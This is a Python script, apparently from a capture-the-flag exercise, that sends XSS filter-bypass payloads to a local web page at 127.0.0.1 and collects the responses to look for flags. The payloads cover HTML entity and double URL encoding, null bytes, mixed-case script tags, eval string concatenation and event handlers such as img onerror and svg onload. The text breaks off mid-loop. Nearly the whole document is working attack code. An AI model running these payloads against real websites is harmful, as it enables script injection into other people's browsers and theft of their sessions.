import requests
import urllib.parse
import re
import base64

# Base URL
target_url = "http://127.0.0.1:32810/page"

print("="*80)
print("ENHANCED XSS BYPASS TESTING - Searching for Execution & Flags")
print("="*80)

# Track all responses for flag scanning
all_responses = []

# Technique 1: HTML Entity Encoding (decimal)
print("\n[1] HTML Entity Encoding (Decimal)")
payload1 = "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;"
print(f"  Payload: {payload1}")
resp1 = requests.get(target_url, params={"name": payload1}, timeout=5)
all_responses.append(("HTML Entity (Decimal)", resp1))
print(f"  Status: {resp1.status_code}, Length: {len(resp1.text)}")

# Technique 2: HTML Entity Encoding (hex)
print("\n[2] HTML Entity Encoding (Hex)")
payload2 = "&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;alert('XSS')&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"
print(f"  Payload: {payload2}")
resp2 = requests.get(target_url, params={"name": payload2}, timeout=5)
all_responses.append(("HTML Entity (Hex)", resp2))
print(f"  Status: {resp2.status_code}, Length: {len(resp2.text)}")

# Technique 3: URL Double Encoding
print("\n[3] URL Double Encoding")
payload3 = "%253Cscript%253Ealert(%2527XSS%2527)%253C%252Fscript%253E"
print(f"  Payload: {payload3}")
resp3 = requests.get(target_url, params={"name": payload3}, timeout=5)
all_responses.append(("URL Double Encoding", resp3))
print(f"  Status: {resp3.status_code}, Length: {len(resp3.text)}")

# Technique 4: Unicode Normalization
print("\n[4] Unicode Normalization")
payload4 = "%u003Cscript%u003Ealert('XSS')%u003C/script%u003E"
print(f"  Payload: {payload4}")
resp4 = requests.get(target_url, params={"name": payload4}, timeout=5)
all_responses.append(("Unicode Normalization", resp4))
print(f"  Status: {resp4.status_code}, Length: {len(resp4.text)}")

# Technique 5: Null Byte Injection
print("\n[5] Null Byte Injection")
payload5 = "%00%3Cscript%3Ealert('XSS')%3C/script%3E"
print(f"  Payload: {payload5}")
resp5 = requests.get(target_url, params={"name": payload5}, timeout=5)
all_responses.append(("Null Byte Injection", resp5))
print(f"  Status: {resp5.status_code}, Length: {len(resp5.text)}")

# Technique 6: Character Concatenation
print("\n[6] Character Concatenation")
payload6 = "<script>eval('al'+'ert(\'XSS\')')</script>"
print(f"  Payload: {payload6}")
resp6 = requests.get(target_url, params={"name": payload6}, timeout=5)
all_responses.append(("Character Concatenation", resp6))
print(f"  Status: {resp6.status_code}, Length: {len(resp6.text)}")

# Technique 7: Case Variations
print("\n[7] Case Variations")
case_payloads = [
    ("Mixed Case 1", "<ScRiPt>alert('XSS')</ScRiPt>"),
    ("Mixed Case 2", "<sCrIpT>alert('XSS')</sCrIpT>"),
    ("Upper Case", "<SCRIPT>alert('XSS')</SCRIPT>"),
    ("Random Case", "<ScrIPt>alert('XSS')</sCRipT>")
]

for name, payload in case_payloads:
    print(f"  {name}: {payload}")
    resp = requests.get(target_url, params={"name": payload}, timeout=5)
    all_responses.append((name, resp))
    print(f"  Status: {resp.status_code}, Length: {len(resp.text)}")

# Additional Advanced Techniques

# Technique 8: Alternative Event Handlers (in case script tags blocked)
print("\n[8] Alternative Event Handlers")
alt_payloads = [
    ("IMG OnError", "<img src=x onerror=alert('XSS')>"),
    ("SVG OnLoad", "<svg onload=alert('XSS')>"),
    ("Body OnLoad", "<body onload=alert('XSS')>"),
    ("iframe OnLoad", "<iframe onload=alert('XSS')></iframe>"),
]

for name, payload in alt_payloads:
